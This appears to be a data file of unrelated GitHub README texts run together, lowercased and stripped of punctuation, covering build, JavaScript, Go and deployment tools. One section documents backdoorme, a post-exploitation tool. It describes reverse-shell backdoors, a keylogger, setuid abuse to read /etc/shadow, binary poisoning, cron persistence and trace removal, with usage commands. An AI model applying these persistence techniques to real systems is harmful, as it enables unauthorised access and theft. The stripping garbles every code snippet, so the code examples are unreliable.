reduce the size of your executable if multiple different versions of the same module are being used just be weary of compiler errors due to version conflicts in most cases this option should be avoided when using regular non external cpm modules force only one module version  as pointed out in the externals section you may force all consumers indirect or direct of your module to use only one version most module creators won t need to worry about this corner case but it is required that all externals use this include a call to cpmforceonlyonemoduleversion anywhere in your module s cmakelists txt file to enforce this usually this call is made directly before calling cpminitmodule if you do this you should indicate that your module is an external in your module s json file even if you don t use any external code it is important to separate these modules from regular modules and the nomenclature we have chosen for these types of modules are externals downloading repos without external projects  cpm provides a utility function that allows you to download repositories at configuration time this function is cpmensurerepoiscurrent this function will also ensure the tag you specify is up to date and the repo is present before continuing execution of cmakelists txt you can download both git repositories and svn repositories using this function for a reference regarding the function s parameters see the comments at the top of cpm cmake for examples of using this function see the how do i cache modules  cpm supports cached repositories and modules by setting either the cpmmodulecachedir cmake variable or the cpmcachedir environment variable to an appropriate cache directory such as and cpmcache when set a search will be performed in the cache directory for all modules that don t already exist in your project s build directory if the module is not found in the cache directory cpm will download the module into the cache directory this is useful if you find yourself with no or limited internet access from time to time as your cache directory will be searched before attempting to download the repository from the internet here s a quick example of using this variable from the command line cmake dcpmmodulecachedir and cpmcache the cache directory is searched only when a module is not found in your project s build directory if the module is then found in the cache directory the cache directory will be updated using the appropriate scm and its directory contents will be copied into your project s build directory any subsequent invokation of cmake will find the module in your project s build directory and will not search in the cache directory unless you have cleaned the project or removed the build directory s modules how do i cache cpm itself  use the following code snippet instead of the one given above this snippet checks to see if cpm exists in the cache directory before attempting to download it set cpmdir cmakecurrentbinarydir and cpm packages cache type string findpackage git if not gitfound message fatalerror cpm requires git if not defined cpmmodulecachedir and not env cpmcachedir strequal set cpmmodulecachedir env cpmcachedir if not exists cpmdir and cpm cmake and defined cpmmodulecachedir if exists cpmmodulecachedir and githubiaunscpm message status found cached version of cpm file copy cpmmodulecachedir and githubiaunscpm and destination cpmdir endif if not exists cpmdir and cpm cmake executeprocess resultvariable errorcode outputquiet errorquiet if errorcode message fatalerror cpm failed to get the hash for head endif include cpmdir and cpm cmake cpmfinish how do i see the module dependency hierarchy  when building your project define cpmshowhierarchy true on the command line this would look something like cmake dcpmshowhierarchy true it is best to run this command after you have successfully built your project so the output is not muddied by status messages i get errors regarding reused binary directories  if you get errors similar to the binary directory and users and jhughes and me and cpp and cpm and modules and and bin is already used to build a source directory it cannot be used to build source directory this means that there exists a circular module reference which is not allowed in cpm the module graph must not contain cycles for example if module a adds module b and module b adds module a you will get this error how do i manage cpm namespaces  there are a number of options here you could rename the cpm name ns at the top of your implementation files namespace spire cpmspirens or you can build a header that renames all of the module namespaces for you something akin to the following ifndef mynamespacesh define mynamespacesh and and forward declaration of cpm module namespaces namespace cpmspirens namespace cpmspirescirunns more forward declarations and and renaming the namespaces in our top level namespace namespace

39861957, save and load the redux state with ease my focus has left the node and react ecosystem and this module has got a new home flexible storage engines localstorage based on window localstorage or for environments without promise support localstoragefakepromise reactnativeasyncstorage based on react native and asyncstorage flexible state merger functions simple merger simple merge plain old js structures default immutablejs merger immutablejs merge plain old js and immutable objects storage engines can be async load and save actions that can be observed save type reduxstoragesave  payload and state tree and load type reduxstorageload  payload and state tree and various engine decorators debounce batch multiple save operations engines use different storage types filter only store a subset of the whole state tree immutablejs load parts of the state tree as immutable objects migrate versioned storage with migrations black and whitelist actions from issuing a save operation npm install save redux storage and you need to install at least one redux storage engine npm engine  as redux storage is only the management core import as storage from redux storage and and import redux and all your reducers as usual import createstore applymiddleware combinereducers from redux import as reducers from and reducers and and we need to wrap the base reducer as this is the place where the loaded and and state will be injected and and note the reducer does nothing special it just listens for the load and and action and merge in the provided state and and note a custom merger function can be passed as second argument const reducer storage reducer combinereducers reducers and and now it s time to decide which storage engine should be used and and note the arguments to createengine are different for every engine import createengine from redux storage engine localstorage const engine createengine my save key and and and with the engine we can create our middleware function the middleware and and is responsible for calling engine save with the current state afer and and every dispatched action and and note you can provide a list of action types as second argument those and and actions will be filtered and won t trigger calls to engine save const middleware storage createmiddleware engine and and as everything is prepared we can go ahead and combine all parts as usual const createstorewithmiddleware applymiddleware middleware createstore const store createstorewithmiddleware reducer and and at this stage the whole system is in place and every action will trigger and and a save operation and and but an existing old state has not been restored yet it s up to you to and and decide when this should happen most of the times you can and should do this and and right after the store object has been created and and to load the previous state we create a loader function with our prepared and and engine the result is a function that can be used on any store object you and and have at hand const load storage createloader engine load store and and notice that our load function will return a promise that can also be used and and to respond to the restore event load store then newstate console log loaded state  newstate catch console log failed to load previous state they all are published as own packages on npm but as a convention all engines share the keyword redux storage engine npm engine  decorators can be found with redux storage decorator npm decorator and mergers with redux storage merger npm merger so it s pretty trivial to find all the additions to redux storage you need smile redux storage will trigger actions after every load or save operation from the underlying engine you can use this for example to display a loading screen until the old state has been restored like this import load save from redux storage function storageawarereducer state loaded false  action switch action type case load return state loaded true case save console log something has changed and written to disk default return state if you pass an array of action types as second argument to createmiddleware  those will be added to a internal blacklist and won t trigger calls to engine save import createmiddleware from redux storage import appstart from and constants const middleware createmiddleware engine appstart if you want to whitelist all actions that are allowed to issue a engine save  just specify them as third argument import createmiddleware from redux storage import shouldsave from and constants const middleware

21156155,  a simple lightweight module for displaying notifications in your angularjs app both js and css files combine for   kbs with v   comes a couple new features the first being able to target a specific container for your notification to display in for a more modular style display to do so simply specify a target option with the value set to a css selector string when you set a message or setup the initial configuration more on that below modular notifications in addition you are now able to provide a callback that will fire after fadeout and the notification has been removed from view this callback can be added as an optional third parameter when calling the set method more on that here notification callbacks with these changes comes a refactor that uses notification instances which will assist with future development as we look to introduce new features like stacked notifications and upgrade for use with angular  implementation  angularjs is the only dependency animation is achieved with pure js jquery not necessary you can install ng notify with bower bower install ng notify save you can also install ng notify with npm npm install ng notify save as of v   ng notify is now available via the jsdelivr cdn if you d prefer to go down that route and and cdn jsdelivr net and angular ng notify and version number here and ng notify min js and and cdn jsdelivr net and angular ng notify and version number here and ng notify min css for example and and cdn jsdelivr net and angular ng notify and    and ng notify min js and and cdn jsdelivr net and angular ng notify and    and ng notify min css and as always you can download the source files straight from this repo they re located in the dist dir be sure to include the minified version of both js and css files after including ng notify min js and ng notify min css  inject the ng notify provider into your project javascript var app angular module demo  ngnotify now you can trigger notifications from anywhere in your app to display a notification just use the set method javascript ngnotify set your notification message goes here to specify the type of notification to display provide the optional type param for available types check the definitions definitions below javascript ngnotify set your error message goes here  error advanced usage  you can override the default options for all notifications by using the config method none of these options are required for available options check the definitions definitions below javascript ngnotify config theme pure  position bottom  duration  type info  sticky false button true html false you can also pass an object of options to individual notifications you can pass through any combination of our available options here as well for available options check the definitions definitions below for example javascript ngnotify set your first message  position top  sticky true ngnotify set your second message  type error  duration  ngnotify set your third message  error and and original use case still works too ngnotify set your i fourth and i message  theme pitchy  html true sticky notifications allow you to set a persistent notification that doesn t fade away to do this simply set the sticky attribute to true javascript ngnotify set this is sticky  sticky true this will give the user the option of closing the notification themselves if you need to dismiss a notification manually you can do so with the dismiss method like this javascript ngnotify dismiss if you d prefer to dismiss the notification programmatically and prevent the user from doing so you can add an option to remove the button javascript ngnotify set this is sticky without a button  sticky true button false any time a notification is set to sticky the duration attribute will be ignored since the notification will not be automatically fading out html notifications will allow you to display messages with html content in them to do this you ll need to set the html attribute to true javascript ngnotify set this has b html and b content  html true you can also set html notifications to be enabled for all of your notifications by adding it the ngnotify config like so javascript ngnotify config html true if you don t have ngsanitize included and you do set html to true ngnotify will gracefully degrade back to the default message display and print a debug message to remind you in your browser s console by specifying a target option you are able to control where your notifications are displayed by default the target is set to the body tag but you may provide any other css selector in order to control where the notification is appended for example javascript ngnotify set this message has a specific container  target new container you may also specific a default target for all notifications by adding it to the ngnotify config for example javascript ngnotify config target new container notifications that have a custom target specified are set to display with absolute positioning overriding the default fixed positioning it s impossible to tailor ngnotify s style to fit every situation for every app so you may have to tweak the styles to fit your specific needs when not appending notifications to the body tag using anything other than the default target you have an option to call a function when a notification has completed this callback can only be called through the set method and is passed as an optional third parameter for example javascript var callback function ngnotify set this message has a callback   callback the callback will fire every time it is specified even if the notification is dismissed early through the dismiss method the callback fires once the notification has faded out there are two additional methods that allow you to create your own types and themes creating a custom type will allow you to add additional types of notifications to use throughout your application to create a new type use the addtype method the first param is the name you ll use to reference your new type the second param is the class you ll use to style your new notification type javascript ngnotify addtype notice  my notice type then you can set any of your notifications up to use that type as you would any other triggering it by using the name you gave it javascript ngnotify set this notification is using our new type  notice to style your new type pick a color you d like to use and set it to the background color of your new style my notice type background color abc creating a custom theme will allow you to build an entirely new spectrum of notification messages utilizing the existing notification types to create a new theme use the addtheme method the first param is the name you ll use to reference your new theme the second param is the class you ll use to style your new theme s notification types javascript ngnotify addtheme newtheme  my new theme now you can activate your new theme via the config method using the name you previously assigned to it javascript ngnotify config theme newtheme to style your new theme pick a collection of colors you d like to use for each notification type and set them to each type s background color my new theme ngn info background color cc my new theme ngn error background color ff my new theme ngn success background color cc my new theme ngn warn background color ff my new theme ngn grimace background color  the position size color alignment and more are all styled based on the notification s classes and are all specified in the css file see the style definitions styles below to see which classes can be used to override any of the styles within your own application definitions  displays a notification message and sets the formatting and behavioral options for this one notification message string required the message to display in your notification type string and object optional the type of notification to display string or an object of options types info default error success warn grimace options see config below callback string optional target to append notification to value set to css selector sets default settings for all notifications to take into account when displaying options object an object of options that overrides the default settings theme string optional sets the theme to use altering the styles for each notification type pure default prime pastel pitchy type string optional sets the default notification type when a type isn t explicitly set info default error success warn grimace position string optional sets where the notifications will be displayed at in the app bottom default top duration integer optional the duration the notification stays visible to the user in milliseconds sticky bool optional determines whether or not the message will fade at the end of the duration or if the message will persist until the user dismisses it themselves when true duration will not be set even if it has a value false by default button bool optional determines whether or not the dismiss button will show on sticky notifications when true the button will display when false the button wil not display sticky must be set to true in order to control the visibility of the dismiss button true by default target string optional css selector where the notification s should be appended to body by default manually dismisses any sticky notifications that may still be set allows a dev to create a new type of notification to use in their app name string required the name used to trigger this notification type in the set method class string required the class used to target this type in the stylesheet allows a dev to create a whole new set of styles for each notification type name string required the name used when setting the theme in the config object class string required the class used to target this theme in the stylesheet primary the class that s present on every notification and controls all of the primary styles ngn position purely responsible for where notifications are displayed default is set to bottom one is present on every notification ngn top ngn bottom types default classes for setting each notification type s background color default is set to info one is present on every notification ngn info ngn error ngn success ngn warn ngn grimace themes theme specific classes that are chained together with type classes to override default background colors not always present default excludes all of these ngn prime ngn pastel ngn pitchy sticky styles responsible for displaying the dismissal button for sticky notifications ngn sticky displays the dismissal button when sticky is enabled ngn dismiss styles the dismissal button development  if you ve forked or cloned the project and would like to make any sort of adjustments there are few items to make note of first your system will need to have the following bits in place node npm second there are a few grunt tasks that you ll be able to leverage to help validate and prepare your changes for use you can fire off a grunt or grunt build command manually at any time to lint minify and setup your demo built in the gh pages dir for testing console grunt or grunt build also you can run grunt dev to lint minify and prep your demo for testing once the build is complete it ll also fire off a watch so that any changes that are made to the the sass js and demo files will automatically trigger the build script to update your project console grunt dev to run through the configured unit tests you can run grunt test this will fire off a series of tests that check that all default options are set correctly all configurable options are able to be set correctly and that all methods carry out the functionality that they re supposed to these tests should let you know if any of the updates that you ve made have negatively effected any preexisting functionality also when the tests complete there will be a test coverage report generated and stored in the coverage directory console grunt test next you ll want to do all of your development within three locations if you add changes anywhere else they re likely to be overwritten during the build process these locations are src and scripts and ng notify js for any script modifications src and styles and ng notify sass for any style modifications demo and for any modifications to the demo lastly once you ve made your changes and run through the appropriate grunt tasks your changes should be baked and ready for you to consume located in the dist directory as minified js and css files
22300494, i was curious about chris mccord s phoenix vs rails article original if you haven t read it go do that now first go ahead this will still be here when you get back it won t make much sense unless you ve read the original like many other elixir enthusiasts i come from a ruby background that said i found rails to be a curious choice for comparison to phoenix since rails is really a kitchen sink framework meant to handle everything from database migrations to asset pipeline compilation sinatra on the other hand is a more modular semi minimal framework that is appears to be pretty close in philosophy to what phoenix looks like at the moment at least to me while i didn t expect the performance to match elixir and phoenix i was curious what would happen if i dropped those same erb templates in a minimal sinatra app instead of a rails one and heck while i was there since express is essentially sinatra for node why not do a quick port over there for comparison too and then i realized there was a sinatra inspired framework for go called martini so what the heck i went crazy and made one for that as well important note my benchmarking here was primarily for fun not science it was mostly an interesting exercise to write the identical application in many of the sinatra like web frameworks to see how similar they were across languages more on this later in the end i had a comparison of the following phoenix elixir eex rails ruby erb sinatra ruby erb express nodejs ejs martini go template and html for the most part i tried to keep things as close as possible to the original comparison i used the same exact templates splitting them up into equivalent files i tried to do things the same way in every instance rather than getting clever and micro optimizing for performance if you compare the application logic across version you should hopefully find it to be very consistent there was a few gotchas that i adjusted with the new additions to try to get at least a closer to an apples to apples comparison since phoenix didn t appear to be logging to stdout rack s default logger was disabled to be more comparable netting a  throughput increase right there nodejs cannot run multi threaded so cluster mode with multiple processes is required to take advantage of multi core i used express cluster to make this fairly trivial to implement i included benchmarks with this both enabled and disabled express now pushes all partial and layout handling to the template engine ejs doesn t really handle block layouts only includes therefore the layout template needs to be split into a layoutheader and layoutfooter which was manually included in the index template this probably doesn t make a big difference but since it s the only template difference i figured i should mention it i m sure some people will complain about my usage of martini versus a more idiomatic go solution however this is intended to be a comparison of similar style frameworks so it makes sense to use the one that works in the same style i originally didn t find rails to be as apt a comparison for this use case as sinatra since it contains a lot of functionality not being used here that contributes to overhead for that reason i didn t do too much here that said there is probably a lot that can and should be disabled in rails that is there by default for free if you wanted this to be a closer comparison pull requests welcome if you care phoenix has evolved quite a bit since the first version of this post it s taken on a lot of great functionality moving it perhaps closer to being a rails alternative than sinatra this somewhat obviates the point of these benchmarks which were to compare to more minimal sinatra like frameworks  but let s update them anyhow and see if phoenix can maintain its excellent performance characteristics while taking on more additionally i received prs to add two new additional frameworks to the mix gin is another sinatra like for go focused on performance the play framework is a jvm platform that seems a bit more similar to rails to me but with the expanded functionality phoenix has taken on is probably a good comparison and finally since phoenix has evolved and taken on so much functionality jos valim contributed an example of using plug for an ultra minimal elixir based solution on a side note i never expected these tests to get so much attention a sincere thanks to everyone who has contributed prs feedback and commentary i ran these on my imac intel core i   ghz  cores  gb ram note all benchmarks run on a local dev machine are highly suspect if you want more scientific results these should really be done in a production server environment  and framework and throughput req and s and latency ms and consistency  ms and and and and and and and gin and   and   and   and and phoenix and   and   and      and and express cluster and   and   and   and and martini and   and   and   and and sinatra and   and   and   and and express and   and   and   and and rails and   and   and   and and plug    and   and   and   and and play    and   and   and   and  consistency for both erlang solutions have become more unstable in this round of tests compared to previous where it was rock solid it appears to be somewhat specific to my erlang install but i haven t been able to locate a reason for it yet some others are experiencing similar results we have been discussing this in the elixir lang irc channel if you want to help  play consistently appeared to generate hundreds of socket read errors see the detailed output  so i believe it should probably be semi disqualified from the results for now you can view the detailed results and resultsv md  or see the original round of benchmarks and resultsv md to compare update july  there is a now a slightly more recent version update run as round  and resultsv md please note i do not intend to continue updating these benchmarks further past this point  the only benchmarks that really matter are the ones that apply to your own environment and use case this was really just for curiosity and fun that said some things stuck out to me as seen in the numerous caveats looking into tuning things like caching or the impact of logging strategies will have a major impact on your overall app performance quite possibly more than platform think about your own use case and pick a strategy accordingly the default performance of phoenix and elixir is quite impressive especially for such young projects given that elixir is also one of the most conceptually enjoyable languages that i ve personally coded with in years i m pretty bullish about their future looking at the nodejs and express performance it s clear that if you use nodejs in production on multi core boxes you should probably be using cluster workers but do your own research they won t be appropriate for every situation sinatra is pretty awesome to begin with the similarity in writing the code for all these frameworks was pretty astonishing check out how similar they all are  and it shows how influential the modular approach taken by sinatra has been in inspiring other frameworks if you are a ruby user currently using rails check out sinatra for a more bottom up approach and compare finally really please never focus on contrived benchmarks as a way to pick the best environment for your project think about your use case but also optimize for developer productivity and happiness i ve used most of these languages and frameworks in production and each has cases which make it more desirable in certain circumstances there is no best language and framework for all situations i ve worked with all of the languages involved in production systems with the exception of elixir which i m just getting started with that said i m nowhere near an expert in any of them so feedback comments and pull requests are encouraged i m publishing this as a github repo rather than a blog post since the intended audience is nerds if you want to comment in lieu of a comment thread just open a github issue with the subject of your comments gh issues or participate in one on the same topic if it already exists  i m also currently working on a similar showdown for twitter streaming api libraries twitter showdown  and it could use your help  if you enjoyed these benchmarks and programs or found them useful please consider following me on github mroth gh or twitter mroth tw to see when i post new projects v man v
7162561, chainable api transaction support migration and schema generation model validations model event hooks database dialect interface no implicit fields clean and testable codebase dialects currently implemented if the dialect is registered you can open the database directly using hd err hood open postgres  user username dbname database or you can pass an existing database and dialect to hood new sql db hood dialect hd hood new db newpostgres schemas can be declared using the following syntax only for demonstration purposes would not produce valid sql since it has  primary keys type person struct and and auto incrementing int field id id hood id and and custom primary key field firstname  with presence validation firstname string sql pk validate presence and and string field lastname with size  not null lastname string sql size  notnull and and string field tag with size  default value customer tag string sql size  default customer and and you can also combine tags default value orange combinedtags string sql size  default orange birthday time time and and timestamp field birthday data byte and and data field data isadmin bool and and boolean field isadmin notes string and and text field notes and and you can alternatively define a var char as a string field by setting a size nick string sql size  and and validates number range balance int validate range   and and these fields are auto updated on save created hood created updated hood updated and and and other built in types int uint float and and indexes are defined via the indexed interface to avoid and and polluting the table fields func table person indexes indexes hood indexes indexes add tagindex  tag and and params indexname unique columns indexes addunique nameindex  firstname  lastname schema creation is completely optional you can use any other tool you like the following built in field properties are defined via sql tag pk the field is a primary key notnull the field must be not null size x the field must have the specified size e g for varchar size  default x the field has the specified default value e g default  or default orange ignores the field to use migrations you first have to install the hood tool to do that run the following go get github com and eaigner and hood cd gopath and src and github com and eaigner and hood and install sh assuming you have your gopath and bin directory in your path  you can now invoke the hood tool with hood before we can use migrations we have to create a database configuration file first to do this type hood create config this command will create a db and config json file relative to your current directory it will look something like this javascript development driver  source production driver  source test driver  source populate it with your database credentials the driver and source fields are the strings you would pass to the sql open  function now hood knows about our database so let s create our first migration with hood create migration createusertable and another one hood create migration addusernameindex this command creates new migrations in db and migrations next we have to populate the generated migrations up and down methods like so func m m createusertableup hd hood hood type users struct id hood id first string last string hd createtable users func m m addusernameindexup hd hood hood hd createindex users  nameindex  true first  last the passed in hood instance is a transaction that will be committed after the method now we can run migrations with hood db migrate and roll back with hood db rollback for a complete list of commands invoke hood help a schema go file is automatically generated in the db directory this file reflects the current state of the database in our example it will look like this package db github com and eaigner and hood type users struct id hood id first string last string func table users indexes indexes hood indexes indexes addunique nameindex  first  last besides the sql struct tag you can specify a validate tag for model validation presence validates that a field is set len min max validates that a string field s length lies within the specified range len min validates that it has the specified min length len max or max length range min max validates that an int value lies in the specific range range min validates that it has the specified min value range max or max value regexp  e g a z and  validates that a string matches the regular expression the expression must start with backslash and double quote should be escaped does not work with other validation methods on the same field you can also define multiple validations on one field e g validate len  presence for more complex validations you can use custom validation methods the methods are added to the schema and must start with validate and return an error for example func u user validateusername error rx regexp mustcompile a z  and if rx matchstring u name return newvalidationerror  username contains invalid characters return nil you can add hooks to a model to run on a specific action like so func u user beforeupdate error u updated time now return nil if the hook returns an error on a before action it is not performed the following hooks are defined before and aftersave before and afterinsert before and afterupdate before and afterdelete package main func main and and open a db connection use new alternatively for unregistered dialects hd err hood open postgres  user hood dbname hoodtest sslmode disable if err nil panic err and and create a table type fruit struct id hood id name string validate presence color string err hd createtable fruit if err nil panic err fruits fruit fruit name banana  color yellow  fruit name apple  color red  fruit name grapefruit  color yellow  fruit name grape  color green  fruit name pear  color yellow  and and start a transaction tx hd begin ids err tx saveall fruits if err nil panic err fmt println inserted ids  ids and and      and and commit changes err tx commit if err nil panic err and and ids are automatically updated if fruits  id  and and fruits  id  and and fruits  id  panic id not set and and if an id is already set a call to save will result in an update fruits  color green ids err hd saveall fruits if err nil panic err fmt println updated ids  ids and and      if fruits  id  and and fruits  id  and and fruits  id  panic id not set and and let s try to save a row that does not satisfy the required validations  err hd save fruit if err nil and and err error value not set panic does not satisfy validations should not save and and the markers are db agnostic so you can always use and and e g in postgres they are replaced with   var results fruit err hd where color   green orderby name limit  find results if err nil panic err fmt println results  results and and  banana green and and delete ids err hd deleteall results if err nil panic err fmt println deleted ids

43973921, tools like metasploit are great for exploiting computers but what happens after you ve gained access to a computer backdoorme answers that question by unleashing a slew of backdoors to establish persistence over long periods of time once an ssh connection has been established with the target backdoorme s strengths can come to fruition unfortunately backdoorme is not a tool to gain root access only keep that access once it has been gained please only use backdoorme with explicit permission please don t hack without asking backdoorme is split into two parts backdoors and modules backdoors are small snippets of code which listen on a port and redirect to an interpreter like bash there are many backdoors written in various languages to give variety modules make the backdoors more potent by running them more often for example every few minutes or whenever the computer boots this helps to establish persistence demonstration to start backdoorme first ensure that you have the required dependencies for python   and sudo apt get install python python pip python tk nmap cd backdoorme and virtualenv python python  env source env and bin and activate env pip install r requirements txt for python   sudo python dependencies py launching backdoorme python master py to add a target addtarget target hostname     username victim password password and target  set to use a backdoor simply run the use keyword use shell and metasploit and using current target  and using metasploit backdoor from there you can set options pertinent to the backdoor run either show options or help to see a list of parameters that can be configured to set an option simply use the set keyword msf show options backdoor options option value description required  name initd name of the backdoor false msf set name apache and name apache msf show options backdoor options option value description required  name apache name of the backdoor false as in metasploit backdoors are organized by category auxiliary keylogger adds a keylogger to the system and gives the option to email results back to you simplehttp installs python s simplehttp server on the client user adds a new user to the target web installs an apache server on the client escalation setuid the setuid backdoor works by setting the setuid bit on a binary while the user has root acccess so that when that binary is later run by a user without root access the binary is executed with root access by default this backdoor flips the setuid bit on nano so that if root access is ever lost the attacker can ssh back in as an unprivileged user and still be able to run nano or any chosen binary as root nano and etc and shadow note that root access is initially required to deploy this escalation backdoor shell the shell backdoor is a privilege escalation backdoor similar to but more specific than it s setuid escalation brother it duplicates the bash shell to a hidden binary and sets the suid bit note that root access is initially required to deploy this escalation backdoor to use while sshed in as an unprivileged user simply run bash p  and you will have root access bash uses a simple bash script to connect to a specific ip and port combination and pipe the output into bash bash a slightly different and more reliable version of the above bash backdoor which does not prompt for the password on the client side sh similar to the first bash backdoor but redirects input to and bin and sh sh similar to the second bash backdoor but redirects input to and bin and sh metasploit employs msfvenom to create a reversetcp binary on the target then runs the binary to connect to a meterpreter shell java creates a socket connection using libraries from java and compiles the backdoor on the target ruby uses ruby s libraries to create a connection then redirects to and bin and bash netcat uses netcat to pipe standard input and output to and bin and sh giving the user an interactive shell netcattraditional utilizes netcat traditional s e option to create a reverse shell perl a script written in perl which redirects output to bash and renames the process to look less conspicuous php runs a php backdoor which sends output to bash it does not automatically install a web server but instead uses the web module python uses a short python script to perform commands and send output back to the user web ships a web server to the target then uploads msfvenom s php reversetcp backdoor and connects to the host although this is also a php backdoor it is not the same backdoor as the above php backdoor removessh removes the ssh server on the client often good to use at the end of a backdoorme session to remove all traces sshkey creates rsa key and copies to target for a passwordless ssh connection sshport adds a new port for ssh windows windows uses msfvenom to create a windows backdoor every backdoor has the ability to have additional modules applied to it to make the backdoor more potent to add a module simply use the add keyword msf add poison and poison module added each module has additional parameters that can be customized and if help is rerun you can see or set any additional options msf help poison module options option value description required  name ls name of command to poison false location and bin where to put poisoned files into false currently enabled modules include poison performs bin poisoning on the target computer it compiles an executable to call a system utility and an existing backdoor for example if the bin poisoning module is triggered with ls  it would would compile and move a binary called ls that would run both an existing backdoor and the original ls  thereby tripping a user to run an existing backdoor more frequently adds an existing backdoor to the root user s crontab to run with a given frequency sets up a web server and places a web page which triggers the backdoor simply visit the site with your listener open and the backdoor will begin adds a new user to the target startup allows for backdoors to be spawned with the bashrc and init files whitelist whitelists an ip so that only that ip can connect to the backdoor backdoorme supports multiple different targets concurrently organized by number when entered the core maintains one current target to which any new backdoors will default to switch targets manually simply add the target number after the command use metasploit  will prepare the metasploit backdoor against the second target run list to see the list of current targets whether a connection is open or closed and what backdoors modules are available backdoorme is still very much in its infancy feel free to contribute to the project simply fork it make your changes and issue a pull request have an idea for a killer backdoor or something we could improve make an issue and we ll add it asap please email us at backdoormegit gmail com with any questions if you wish to add your own backdoor follow

266798, this repository contains the complete united states code its purpose is to publish the federal code in a way that makes it easy for interested individuals to access both its content and its changes over another purpose for this repository is to explore some ideas around how to better facilitate the legislative process legislation comes in the form of bills which are essentially patches to the existing legal code many different versions of a patch may float around to be debated discussed amended etc  before a final version is applied to the trunk the process is extremely similar to how developers manage software changes particularly in the open source world i think it would be very cool if something like github were used to manage the actual law all in the open and fully visible to everyone i imagine the official code as sort of a master repository each legislator could fork this repository and hack on his own copy legislators could pull from one another as they massage the language to get it right the house and senate would each have their own forks as would the committees the president too would have a fork of the official repository the legislative process would then be fully visible to anyone who cares to look congressman blowhard commits a change to his code and pushes it to the public fork congressman slick looks at it likes it pulls commits a change and tells blowhard about his change etc eventually the bill makes it to committee and the committee may have several branches indicating the status of bills as they progress through the committee eventually if the bill is voted for presentation to the house it is pulled into the committee s trunk if the house votes to approve the bill then it s pulled to the house s trunk available to be pulled by the senate the senate can make its own modifications and perhaps the result must pass through a house and senate reconciliation committee before being pushed to the passed branch or fork  with a message to the president anyway that s the idea it may seem kind of silly but if you ve ever actually tried to track the progress of a bill through the existing web interfaces it s horribly difficult and there s a lot of information about the bill s movement through the process that simply isn t available i think using revision management tools just might make the whole process both easier and more transparent by tracking the origin and history of amendments riders and just bill authorship generally it becomes easier to hold legislators accountable and that s what i want to play with

i recommend you use this api using this api has a few drawbacks you must define both write and read you cannot use a mix serialize and read or write and deserialize in read  you cannot access the exact object type that you are deserializing to the it type of deserialize if you wish to register a nullable reader or writer you can use registernullabletypeadapter instead you don t have to declare

gson fromjson list user reader attention gson fromjson mytype will return a non nullable type whereas gson fromjson mytype will return a nullable type therefore the code gson fromjson mytype null is correct and will throw a null pointer exception a lot of gson s apis are relying on java lang reflect type to specify a type but kotlin s javaclass returns a java lang class which is a type but suffers from type erasure to mediate this issue gson uses typetoken to create java lang reflect type objects without type erasure if you need such a type object you can simply use the typetoken function the same way you use the javaclass function for example typetoken map string list user careful the typetoken function behaves slightly differently then gson s typetoken class when providing a non specialized generic type typetoken list will return class list while gson s mechanism will return a parameterizedtype if you really need a parameterizedtype for a non specialized generic type you can use the gsontypetoken function kotson allows you to simply convert a jsonelement to a primitive a jsonobject or a jsonarray kotlin import com github salomonbrys kotson val s json string and and

8069402, introduction  git deliver is a gpl licensed delivery system based on git it uses git push combined with ssh as a way of delivering a project as of a specific git commit to various environments git remotes simply and securely it also helps keeping track of what is delivered on which server compared to a regular git push and checkout git deliver makes the delivery atomic structures the delivery process in stages and handles errors while maintaining availability archives delivered versions and automates rollback logs everything provides an easy way of knowing what is delivered where checking integrity and knowing when and by whom a version was delivered intends to provide pre baked delivery recipes for common development environments each delivery remote is a bare git repository in the root of which git deliver creates a delivered folder this folder will contain one non bare clone of the base repository for each delivery the git clones share their metadata with the main repository for the remote to avoid excessive space usage and copy time the current version s clone is used through a current symlink which is switched once the new version is ready to make the delivery atomic a delivery is done in stages at each stage bash scripts can be run that can be tailored to the project commonly used script sets can be shared in the form of presets installation  all platforms  clone this repository in the directory of your choice in your gitconfig add this line in the alias section if you receive an error such as fatal cannot exec git deliver permission denied note that cloning this repo into your path will result in the above error so either move it to outside of your path or rename it a simple example tl dr  let s assume for this example that you have a simple project for which a delivery just means copying files the example below assumes that the server is accessible with ssh to setup your project for git deliver in your project directory run git deliver init create a bare repository on the server where you want the project delivered and add it as a remote in your local git project or ask git deliver to do it git deliver init remote testserver user testserver example com and projectfiles you can then perform your first delivery here of your local master git deliver testserver master your project is now accessible on testserver example com at and projectfiles and delivered and current let s deliver another version tagged v  git deliver testserver v  you can ask git deliver what the current version on testserver is who delivered it and when git deliver status testserver git deliver remote ref deliver ref sha tag branch on remote git deliver status remote returns the version delivered if any on remote  or on all remotes if remote is not specified git deliver rollback remote previouslydeliveredfolder switches back to a previously delivered version on remote this is like a regular delivery except we reuse an already delivered folder and use it to start the process at stage pre symlink you can give the name of a previous delivery folder if you don t the previous version is used git deliver gc remote garbage collection remove all previously delivered versions on remote  except the last three current  previous  preprevious  run git gc on the remote s main repository if needed git deliver init presets initialise this repository for git deliver optionally including stage scripts for presets git deliver init remote shared remotename remoteurl initialize git remote remotename for git deliver the remote needs to be bare if it does not exist yet it can be created at remoteurl if the remote exists but does not point to a bare repository the repository will be created the shared parameter if supplied is then passed as is to git init see man git init git deliver list presets list available presets for init how it works  to get started you d run git deliver init in your git working folder this would create an empty deliver folder next to the git one you d then be able to create scripts in this folder to customize the delivery process should you want to you could keep the deliver folder under version control and share it with your team that way if you wanted to start with presets for a given environment you d give init a list of preset names something like git deliver init rails would copy the rails scripts which might depend on others which will be automatically copied as well the list of available presets can be viewed by running git deliver list presets note that although the mechanisms are there presets themselves are pretty much inexistent right now i very much welcome contributions in this area once our working copy is ready if you have init remote scripts you ll need to run git deliver init remote remote to run those they might be used to install external dependencies on the remote if you don t have init remote scripts remote initialization is not needed git deliver will warn you at the first delivery if you forget to initialize a remote that requires it a delivery is initiated by running git deliver remote ref here s the timeline of what happens we run preliminary checks by default we just check the available disk space on the remote but you can create pre delivery scripts to add checks the commit to deliver is pushed to the remote and the remote repository cloned in the delivered folder post checkout scripts are then run your scripts might change the delivered files we therefore do a commit in the clone repository to save the delivered state if the repository you are delivering to is a shared one the files are given group write permissions and made to belong to the same group as the objetcs folder in the repository we then run the pre symlink scripts we change the current  previous and preprevious symlinks atomically to point to the corresponding new folders and run the post symlink scripts during the symlink update the current symlink always exists and always points to a version of your software unless you try to deliver to a system having neither gnu mv nor python installed in which case there will be a short time during which the current symlink will be missing git deliver will warn you of this if any of the run scripts fails has a non zero exit status or if an internal git deliver step fails we ll stop the delivery there and initiate a rollback to do this we ll run the rollback pre symlink scripts switch the symlinks back if necessary if we went as far in the process as to change them in the first place  then run the rollback post symlink scripts stage scripts  stage scripts are bash scripts that can be run at the various stages of a delivery at a specific stage git deliver will run everything in deliver and scripts and stage that has a name ending in sh 